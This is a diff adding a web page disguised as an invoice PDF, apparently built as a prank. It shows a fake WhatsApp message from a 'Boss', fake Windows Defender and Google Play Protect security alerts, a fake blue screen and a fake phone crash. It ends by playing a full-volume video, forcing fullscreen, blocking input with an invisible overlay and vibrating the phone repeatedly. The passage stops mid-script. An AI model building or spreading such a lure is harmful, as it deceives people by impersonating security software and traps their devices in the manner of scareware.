@@ -1,0 +1,1308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <title>📄 Invoice_Receipt_2024.pdf</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📄</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            touch-action: none;
+        }
+
+        /* ===== FAKE WHATSAPP / MESSAGE SCREEN (MOBILE) ===== */
+        #mobileChat {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #111b21;
+            z-index: 9999999;
+            flex-direction: column;
+        }
+
+        .chat-topbar {
+            background: #1f2c34;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #2a3942;
+        }
+
+        .chat-back {
+            font-size: 22px;
+            color: #00a884;
+        }
+
+        .chat-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #00a884;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .chat-name-area {
+            flex: 1;
+        }
+
+        .chat-name {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .chat-status {
+            color: #8696a0;
+            font-size: 12px;
+        }
+
+        .chat-icons {
+            display: flex;
+            gap: 20px;
+            font-size: 20px;
+            color: #8696a0;
+        }
+
+        .chat-body {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            background: #0b141a;
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .msg-bubble {
+            max-width: 80%;
+            padding: 8px 12px;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+            line-height: 1.4;
+            position: relative;
+            animation: msgIn 0.3s ease;
+        }
+
+        @keyframes msgIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .msg-received {
+            background: #1f2c34;
+            color: #e9edef;
+            border-top-left-radius: 0;
+            align-self: flex-start;
+        }
+
+        .msg-sent {
+            background: #005c4b;
+            color: #e9edef;
+            border-top-right-radius: 0;
+            align-self: flex-end;
+            margin-left: auto;
+        }
+
+        .msg-time {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            text-align: right;
+            margin-top: 3px;
+        }
+
+        .msg-file {
+            background: #1f2c34;
+            border-radius: 10px;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top-left-radius: 0;
+            margin-bottom: 8px;
+            max-width: 80%;
+            cursor: pointer;
+            animation: msgIn 0.3s ease;
+        }
+
+        .msg-file-icon {
+            font-size: 35px;
+        }
+
+        .msg-file-info {
+            flex: 1;
+        }
+
+        .msg-file-name {
+            color: #e9edef;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .msg-file-size {
+            color: #8696a0;
+            font-size: 11px;
+            margin-top: 2px;
+        }
+
+        .msg-file-btn {
+            background: #00a884;
+            color: white;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .chat-bottom {
+            background: #1f2c34;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .chat-input {
+            flex: 1;
+            background: #2a3942;
+            border: none;
+            border-radius: 25px;
+            padding: 10px 15px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .chat-send {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: #00a884;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        /* ===== FAKE PC LOADING SCREEN ===== */
+        #fakeLoader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #f0f0f0;
+            z-index: 9999999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fake-icon { font-size: 60px; margin-bottom: 15px; }
+
+        .fake-filename {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 25px;
+            font-weight: 500;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .loader-bar-bg {
+            width: 280px;
+            max-width: 80%;
+            height: 5px;
+            background: #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .loader-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #0078d4, #00bcf2);
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+
+        .loader-text { font-size: 12px; color: #888; }
+        .loader-subtext { font-size: 10px; color: #aaa; margin-top: 6px; }
+
+        /* ===== MOBILE LOADING SCREEN ===== */
+        #mobileLoader {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #111b21;
+            z-index: 99999999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-spinner {
+            width: 45px;
+            height: 45px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #00a884;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .mobile-load-text {
+            color: #8696a0;
+            font-size: 14px;
+        }
+
+        .mobile-load-sub {
+            color: #667781;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        /* ===== FAKE ERROR POPUP ===== */
+        #fakeError {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            z-index: 99999999;
+            width: 90%;
+            max-width: 400px;
+            overflow: hidden;
+            animation: popUp 0.3s ease;
+        }
+
+        @keyframes popUp {
+            from { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
+            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+
+        .error-header {
+            background: #e81123;
+            color: white;
+            padding: 12px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .error-body {
+            padding: 20px 16px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+
+        .error-icon { font-size: 35px; flex-shrink: 0; }
+
+        .error-msg h3 { font-size: 13px; color: #333; margin-bottom: 6px; }
+        .error-msg p { font-size: 11px; color: #666; line-height: 1.5; }
+
+        .error-footer {
+            padding: 10px 16px;
+            background: #f9f9f9;
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            border-top: 1px solid #eee;
+        }
+
+        .error-btn {
+            padding: 8px 20px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background: #e7e7e7;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .error-btn.primary {
+            background: #0078d4;
+            color: white;
+            border-color: #0078d4;
+        }
+
+        /* ===== MOBILE ERROR (Android style) ===== */
+        #mobileError {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #303030;
+            border-radius: 28px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.6);
+            z-index: 999999999;
+            width: 85%;
+            max-width: 350px;
+            padding: 24px;
+            animation: popUp 0.3s ease;
+        }
+
+        .mobile-error-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .mobile-error-text {
+            color: #b0b0b0;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .mobile-error-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .mobile-error-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            background: transparent;
+            color: #8ab4f8;
+        }
+
+        .mobile-error-btn.ok {
+            background: #8ab4f8;
+            color: #202020;
+        }
+
+        /* ===== SCANNING POPUP ===== */
+        #scanPopup {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.4);
+            z-index: 999999999;
+            width: 85%;
+            max-width: 380px;
+            overflow: hidden;
+            animation: popUp 0.3s ease;
+        }
+
+        .scan-header {
+            background: #0078d4;
+            color: white;
+            padding: 14px 16px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .scan-body {
+            padding: 25px 20px;
+            text-align: center;
+        }
+
+        .scan-spinner {
+            width: 45px; height: 45px;
+            border: 4px solid #eee;
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            margin: 0 auto 18px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .scan-text { font-size: 13px; color: #333; margin-bottom: 5px; }
+        .scan-subtext { font-size: 11px; color: #999; }
+
+        .scan-progress {
+            width: 100%;
+            height: 4px;
+            background: #eee;
+            margin-top: 15px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .scan-progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #0078d4;
+            transition: width 0.3s;
+        }
+
+        /* ===== BSOD ===== */
+        #bsod {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #0078d7;
+            z-index: 99999999;
+            flex-direction: column;
+            padding: 8vh 8vw;
+            color: white;
+        }
+
+        .bsod-sad { font-size: 80px; margin-bottom: 15px; }
+        .bsod-title { font-size: 20px; margin-bottom: 12px; }
+        .bsod-text { font-size: 12px; line-height: 1.8; color: rgba(255,255,255,0.9); }
+        .bsod-percent { font-size: 12px; margin-top: 25px; color: rgba(255,255,255,0.9); }
+
+        /* ===== MOBILE CRASH SCREEN ===== */
+        #mobileCrash {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: #000;
+            z-index: 99999999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        .crash-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: crashPulse 1s infinite;
+        }
+
+        @keyframes crashPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .crash-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .crash-text {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            padding: 0 40px;
+            line-height: 1.6;
+        }
+
+        .crash-percent {
+            font-size: 13px;
+            color: #8ab4f8;
+            margin-top: 25px;
+        }
+
+        /* ===== FULL SCREEN VIDEO ===== */
+        #prankVideo {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 9999999999;
+            display: none;
+            background: #000;
+        }
+
+        /* ===== INVISIBLE BLOCKER ===== */
+        #blocker {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 99999999999;
+            background: transparent;
+            display: none;
+        }
+
+        /* ===== GLITCH OVERLAY ===== */
+        #glitchOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: 99999999998;
+            pointer-events: none;
+            opacity: 0.08;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0,0,0,0.15),
+                rgba(0,0,0,0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            animation: glitch 0.1s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-2px); }
+            50% { transform: translateX(2px); }
+            75% { transform: translateX(-1px); }
+            100% { transform: translateX(0); }
+        }
+
+        /* ===== VOLUME POPUP ===== */
+        #volumePopup {
+            display: none;
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.85);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 10px;
+            font-size: 13px;
+            z-index: 999999999999;
+            align-items: center;
+            gap: 10px;
+            animation: fadeInOut 2.5s forwards;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            80% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .vol-bar-bg {
+            width: 100px;
+            height: 4px;
+            background: #555;
+            border-radius: 5px;
+        }
+
+        .vol-bar-fill {
+            width: 100%;
+            height: 100%;
+            background: white;
+            border-radius: 5px;
+        }
+
+        /* ===== SCREEN FLASH ===== */
+        #screenFlash {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: white;
+            z-index: 9999999999;
+            pointer-events: none;
+        }
+
+        /* ===== VIBRATION INDICATOR (MOBILE) ===== */
+        #vibIndicator {
+            display: none;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 999999999999;
+            backdrop-filter: blur(10px);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .bsod-sad { font-size: 60px; }
+            .bsod-title { font-size: 16px; }
+            .bsod-text { font-size: 11px; }
+            .fake-icon { font-size: 50px; }
+            .fake-filename { font-size: 13px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== MOBILE: FAKE WHATSAPP CHAT ===== -->
+    <div id="mobileChat">
+        <div class="chat-topbar">
+            <div class="chat-back">←</div>
+            <div class="chat-avatar">👤</div>
+            <div class="chat-name-area">
+                <div class="chat-name">Boss 👔</div>
+                <div class="chat-status">online</div>
+            </div>
+            <div class="chat-icons">
+                <span>📹</span>
+                <span>📞</span>
+                <span>⋮</span>
+            </div>
+        </div>
+
+        <div class="chat-body" id="chatBody">
+            <!-- Messages will be added by JS -->
+        </div>
+
+        <div class="chat-bottom">
+            <span style="font-size:22px;color:#8696a0;">😊</span>
+            <input class="chat-input" placeholder="Type a message" readonly>
+            <button class="chat-send">🎤</button>
+        </div>
+    </div>
+
+    <!-- ===== PC: FAKE FILE LOADING ===== -->
+    <div id="fakeLoader">
+        <div class="fake-icon">📄</div>
+        <div class="fake-filename">Opening Invoice_Receipt_2024.pdf...</div>
+        <div class="loader-bar-bg">
+            <div class="loader-bar-fill" id="loaderFill"></div>
+        </div>
+        <div class="loader-text" id="loaderText">Loading document...</div>
+        <div class="loader-subtext">Adobe Acrobat Reader DC</div>
+    </div>
+
+    <!-- ===== MOBILE LOADING ===== -->
+    <div id="mobileLoader">
+        <div class="mobile-spinner"></div>
+        <div class="mobile-load-text" id="mobileLoadText">Opening file...</div>
+        <div class="mobile-load-sub" id="mobileLoadSub">Please wait</div>
+    </div>
+
+    <!-- ===== PC: FAKE ERROR POPUP ===== -->
+    <div id="fakeError">
+        <div class="error-header">⚠️ Windows Security Alert</div>
+        <div class="error-body">
+            <div class="error-icon">🛡️</div>
+            <div class="error-msg">
+                <h3>This file requires verification</h3>
+                <p>Windows Defender SmartScreen requires verification before opening this document.</p>
+            </div>
+        </div>
+        <div class="error-footer">
+            <button class="error-btn" onclick="2.html">Cancel</button>
+            <button class="error-btn primary" onclick="clickVerify()">Verify & Open</button>
+        </div>
+    </div>
+
+    <!-- ===== MOBILE: FAKE ERROR ===== -->
+    <div id="mobileError">
+        <div class="mobile-error-title">⚠️ Security Check Required</div>
+        <div class="mobile-error-text">
+            Google Play Protect needs to verify this file before opening. This helps keep your device safe.
+        </div>
+        <div class="mobile-error-buttons">
+            <button class="mobile-error-btn" onclick="mobileCancel()">Cancel</button>
+            <button class="mobile-error-btn ok" onclick="mobileVerify()">Verify</button>
+        </div>
+    </div>
+
+    <!-- ===== SCANNING POPUP ===== -->
+    <div id="scanPopup">
+        <div class="scan-header" id="scanHeader">🔍 Scanning Document</div>
+        <div class="scan-body">
+            <div class="scan-spinner"></div>
+            <div class="scan-text" id="scanText">Scanning...</div>
+            <div class="scan-subtext" id="scanSub">Checking file</div>
+            <div class="scan-progress">
+                <div class="scan-progress-fill" id="scanFill"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== PC: BSOD ===== -->
+    <div id="bsod">
+        <div class="bsod-sad">:(</div>
+        <div class="bsod-title">Your PC ran into a problem and needs to restart.</div>
+        <div class="bsod-text">We're just collecting some error info, and then we'll restart for you.</div>
+        <div class="bsod-percent" id="bsodPercent">0% complete</div>
+    </div>
+
+    <!-- ===== MOBILE: CRASH SCREEN ===== -->
+    <div id="mobileCrash">
+        <div class="crash-icon">⚠️</div>
+        <div class="crash-title">System UI isn't responding</div>
+        <div class="crash-text">Your device encountered an error. Attempting recovery...</div>
+        <div class="crash-percent" id="crashPercent">Restarting... 0%</div>
+    </div>
+
+    <!-- ===== VOLUME POPUP ===== -->
+    <div id="volumePopup">
+        🔊 Volume
+        <div class="vol-bar-bg"><div class="vol-bar-fill"></div></div>
+        100%
+    </div>
+
+    <!-- ===== SCREEN FLASH ===== -->
+    <div id="screenFlash"></div>
+
+    <!-- ===== VIBRATION INDICATOR ===== -->
+    <div id="vibIndicator">📳 Vibrating...</div>
+
+    <!-- ===== GLITCH OVERLAY ===== -->
+    <div id="glitchOverlay"></div>
+
+    <!-- ===== THE PRANK VIDEO ===== -->
+    <video id="prankVideo" playsinline webkit-playsinline preload="auto">
+        <!--
+            ╔══════════════════════════════════════╗
+            ║  PUT YOUR VIDEO FILE NAME HERE       ║
+            ║  Replace "prank.mp4" with your file  ║
+            ║  Keep video in SAME folder as HTML   ║
+            ╚══════════════════════════════════════╝
+        -->
+        <source src="video/new.mp4" type="video/mp4">
+    </video>
+
+    <!-- ===== INVISIBLE BLOCKER ===== -->
+    <div id="blocker"></div>
+
+    <script>
+        // ===== DETECT DEVICE =====
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        // ===== ELEMENTS =====
+        const mobileChat = document.getElementById('mobileChat');
+        const chatBody = document.getElementById('chatBody');
+        const fakeLoader = document.getElementById('fakeLoader');
+        const loaderFill = document.getElementById('loaderFill');
+        const loaderText = document.getElementById('loaderText');
+        const mobileLoader = document.getElementById('mobileLoader');
+        const mobileLoadText = document.getElementById('mobileLoadText');
+        const mobileLoadSub = document.getElementById('mobileLoadSub');
+        const fakeError = document.getElementById('fakeError');
+        const mobileError = document.getElementById('mobileError');
+        const scanPopup = document.getElementById('scanPopup');
+        const scanHeader = document.getElementById('scanHeader');
+        const scanText = document.getElementById('scanText');
+        const scanSub = document.getElementById('scanSub');
+        const scanFill = document.getElementById('scanFill');
+        const bsod = document.getElementById('bsod');
+        const bsodPercent = document.getElementById('bsodPercent');
+        const mobileCrash = document.getElementById('mobileCrash');
+        const crashPercent = document.getElementById('crashPercent');
+        const prankVideo = document.getElementById('prankVideo');
+        const blocker = document.getElementById('blocker');
+        const glitchOverlay = document.getElementById('glitchOverlay');
+        const volumePopup = document.getElementById('volumePopup');
+        const screenFlash = document.getElementById('screenFlash');
+        const vibIndicator = document.getElementById('vibIndicator');
+
+        // ===== START BASED ON DEVICE =====
+        window.addEventListener('load', () => {
+            if (isMobile) {
+                startMobilePrank();
+            } else {
+                startPCPrank();
+            }
+        });
+
+        // ══════════════════════════════════════
+        //          MOBILE PRANK FLOW
+        // ══════════════════════════════════════
+
+        function startMobilePrank() {
+            mobileChat.style.display = 'flex';
+
+            const messages = [
+                { type: 'received', text: 'Hey, are you free?', delay: 800 },
+                { type: 'received', text: 'I need to send you something important', delay: 1500 },
+                { type: 'sent', text: 'Yeah sure, what is it?', delay: 2500 },
+                { type: 'received', text: 'Check this file 👇', delay: 3500 },
+                { type: 'file', delay: 4500 },
+                { type: 'received', text: 'Open it ASAP! Its urgent 🔴', delay: 5500 },
+            ];
+
+            messages.forEach(msg => {
+                setTimeout(() => {
+                    addMessage(msg);
+                    // Vibrate on each message
+                    if (navigator.vibrate) navigator.vibrate(100);
+                }, msg.delay);
+            });
+        }
+
+        function addMessage(msg) {
+            const div = document.createElement('div');
+
+            if (msg.type === 'received') {
+                div.className = 'msg-bubble msg-received';
+                div.innerHTML = msg.text + '<div class="msg-time">' + getCurrentTime() + '</div>';
+            } else if (msg.type === 'sent') {
+                div.className = 'msg-bubble msg-sent';
+                div.innerHTML = msg.text + '<div class="msg-time">' + getCurrentTime() + ' ✓✓</div>';
+            } else if (msg.type === 'file') {
+                div.className = 'msg-file';
+                div.innerHTML = `
+                    <div class="msg-file-icon">📄</div>
+                    <div class="msg-file-info">
+                        <div class="msg-file-name">Invoice_Receipt_2024.pdf</div>
+                        <div class="msg-file-size">2.4 MB • PDF</div>
+                    </div>
+                    <button class="msg-file-btn" onclick="openMobileFile()">Open</button>
+                `;
+            }
+
+            chatBody.appendChild(div);
+            chatBody.scrollTop = chatBody.scrollHeight;
+        }
+
+        function getCurrentTime() {
+            const now = new Date();
+            return now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+        }
+
+        function openMobileFile() {
+            mobileChat.style.display = 'none';
+            mobileLoader.style.display = 'flex';
+
+            if (navigator.vibrate) navigator.vibrate(200);
+
+            const loadMsgs = [
+                { text: 'Opening file...', sub: 'Please wait' },
+                { text: 'Reading document...', sub: 'Parsing PDF' },
+                { text: 'Loading content...', sub: 'Almost ready' },
+                { text: 'Preparing viewer...', sub: 'Finalizing' },
+            ];
+
+            let step = 0;
+            const loadInt = setInterval(() => {
+                step++;
+                if (step < loadMsgs.length) {
+                    mobileLoadText.textContent = loadMsgs[step].text;
+                    mobileLoadSub.textContent = loadMsgs[step].sub;
+                }
+                if (step >= loadMsgs.length) {
+                    clearInterval(loadInt);
+                    setTimeout(() => {
+                        mobileLoader.style.display = 'none';
+                        mobileError.style.display = 'block';
+                        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                    }, 500);
+                }
+            }, 800);
+        }
+
+        function mobileCancel() {
+            mobileError.style.display = 'none';
+            if (navigator.vibrate) navigator.vibrate(50);
+            setTimeout(() => {
+                mobileError.style.display = 'block';
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            }, 600);
+        }
+
+        function mobileVerify() {
+            mobileError.style.display = 'none';
+            if (navigator.vibrate) navigator.vibrate(200);
+
+            scanPopup.style.display = 'block';
+            scanHeader.textContent = '🔍 Google Play Protect';
+
+            let scanProgress = 0;
+            const scanMsgs = [
+                { text: 'Scanning file...', sub: 'Checking integrity' },
+                { text: 'Analyzing content...', sub: 'Verifying source' },
+                { text: 'Security check...', sub: 'Play Protect active' },
+                { text: 'Almost done...', sub: 'Final scan' },
+            ];
+
+            const scanInt = setInterval(() => {
+                scanProgress += Math.random() * 22 + 5;
+                if (scanProgress > 100) scanProgress = 100;
+                scanFill.style.width = scanProgress + '%';
+
+                const idx = Math.min(Math.floor(scanProgress / 25), scanMsgs.length - 1);
+                scanText.textContent = scanMsgs[idx].text;
+                scanSub.textContent = scanMsgs[idx].sub;
+
+                if (scanProgress >= 100) {
+                    clearInterval(scanInt);
+                    setTimeout(() => {
+                        scanPopup.style.display = 'none';
+                        showMobileCrash();
+                    }, 500);
+                }
+            }, 400);
+        }
+
+        function showMobileCrash() {
+            mobileCrash.style.display = 'flex';
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
+
+            let progress = 0;
+            const crashInt = setInterval(() => {
+                progress += Math.random() * 12 + 2;
+                if (progress > 100) progress = 100;
+                crashPercent.textContent = 'Restarting... ' + Math.floor(progress) + '%';
+
+                if (progress >= 100) {
+                    clearInterval(crashInt);
+                    setTimeout(() => {
+                        mobileCrash.style.display = 'none';
+                        flashScreen();
+                        setTimeout(() => {
+                            launchVideo();
+                            // Heavy vibration
+                            if (navigator.vibrate) {
+                                navigator.vibrate([500, 200, 500, 200, 500, 200, 1000]);
+                            }
+                        }, 800);
+                    }, 1000);
+                }
+            }, 300);
+        }
+
+        // ══════════════════════════════════════
+        //            PC PRANK FLOW
+        // ══════════════════════════════════════
+
+        function startPCPrank() {
+            fakeLoader.style.display = 'flex';
+
+            let loadProgress = 0;
+            const loadMsgs = [
+                'Loading document...',
+                'Reading file headers...',
+                'Parsing PDF structure...',
+                'Rendering pages...',
+                'Loading fonts...',
+                'Almost ready...',
+                'Finalizing...'
+            ];
+
+            const loadInt = setInterval(() => {
+                loadProgress += Math.random() * 18 + 2;
+                if (loadProgress > 100) loadProgress = 100;
+                loaderFill.style.width = loadProgress + '%';
+                loaderText.textContent = loadMsgs[Math.min(Math.floor(loadProgress / 15), loadMsgs.length - 1)];
+
+                if (loadProgress >= 100) {
+                    clearInterval(loadInt);
+                    setTimeout(() => {
+                        fakeLoader.style.display = 'none';
+                        fakeError.style.display = 'block';
+                    }, 500);
+                }
+            }, 400);
+        }
+
+        function clickCancel() {
+            fakeError.style.display = 'none';
+            setTimeout(() => {
+                fakeError.style.display = 'block';
+            }, 800);
+        }
+
+        function clickVerify() {
+            fakeError.style.display = 'none';
+            scanPopup.style.display = 'block';
+            scanHeader.textContent = '🔍 Windows Defender SmartScreen';
+
+            let scanProgress = 0;
+            const scanMsgs = [
+                { text: 'Scanning document...', sub: 'Checking file integrity' },
+                { text: 'Analyzing content...', sub: 'Verifying digital signature' },
+                { text: 'Running security check...', sub: 'SmartScreen filter active' },
+                { text: 'Checking for threats...', sub: 'No threats found' },
+                { text: 'Preparing to open...', sub: 'Initializing viewer' },
+            ];
+
+            const scanInt = setInterval(() => {
+                scanProgress += Math.random() * 20 + 5;
+                if (scanProgress > 100) scanProgress = 100;
+                scanFill.style.width = scanProgress + '%';
+
+                const idx = Math.min(Math.floor(scanProgress / 20), scanMsgs.length - 1);
+                scanText.textContent = scanMsgs[idx].text;
+                scanSub.textContent = scanMsgs[idx].sub;
+
+                if (scanProgress >= 100) {
+                    clearInterval(scanInt);
+                    setTimeout(() => {
+                        scanPopup.style.display = 'none';
+                        showBSOD();
+                    }, 600);
+                }
+            }, 350);
+        }
+
+        function showBSOD() {
+            bsod.style.display = 'flex';
+            let progress = 0;
+
+            const bsodInt = setInterval(() => {
+                progress += Math.random() * 15 + 1;
+                if (progress > 100) progress = 100;
+                bsodPercent.textContent = Math.floor(progress) + '% complete';
+
+                if (progress >= 100) {
+                    clearInterval(bsodInt);
+                    setTimeout(() => {
+                        bsod.style.display = 'none';
+                        document.body.style.background = '#000';
+                        flashScreen();
+                        setTimeout(() => {
+                            launchVideo();
+                        }, 1200);
+                    }, 1000);
+                }
+            }, 300);
+        }
+
+        // ══════════════════════════════════════
+        //         SCREEN FLASH EFFECT
+        // ══════════════════════════════════════
+
+        function flashScreen() {
+            const colors = ['white', '#ff0000', 'white', '#0000ff', 'white'];
+            colors.forEach((color, i) => {
+                setTimeout(() => {
+                    screenFlash.style.display = 'block';
+                    screenFlash.style.background = color;
+                    setTimeout(() => {
+                        screenFlash.style.display = 'none';
+                    }, 60);
+                }, i * 120);
+            });
+        }
+
+        // ══════════════════════════════════════
+        //      LAUNCH THE PRANK VIDEO!!! 😈
+        // ══════════════════════════════════════
+
+        function launchVideo() {
+            prankVideo.style.display = 'block';
+            blocker.style.display = 'block';
+            glitchOverlay.style.display = 'block';
+
+            prankVideo.muted = false;
+            prankVideo.volume = 1.0;
+            prankVideo.currentTime = 0;
+
+            prankVideo.play().then(() => {
+                showVolumePopup();
+                tryFullscreen();
+            }).catch(() => {
+                prankVideo.muted = true;
+                prankVideo.play().then(() => {
+                    setTimeout(() => {
+                        prankVideo.muted = false;
+                        prankVideo.volume = 1.0;
+                    }, 200);
+                    showVolumePopup();
+                    tryFullscreen();
+                });
+            });
+
+            startProtections();
+            document.body.style.cursor = 'none';
+
+            // Mobile vibration loop
+            if (isMobile && navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([300, 100, 300]);
+                }, 3000);
+            }
+        }
+
+        // ===== VOLUME POPUP =====
+        function showVolumePopup() {
+            volumePopup.style.display = 'flex';
+            setTimeout(() => { volumePopup.style.display = 'none'; }, 2500);
+        }
+
+        // ===== FULLSCREEN =====
+        function tryFullscreen() {
+            const el = document.documentElement;
+            try {
+                if (el.requestFullscreen) el.requestFullscreen();
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                else if (el.msRequestFullscreen) el.msRequestFullscreen();
+            } catch (e) {}
+        }
+
+        // ══════════════════════════════════════
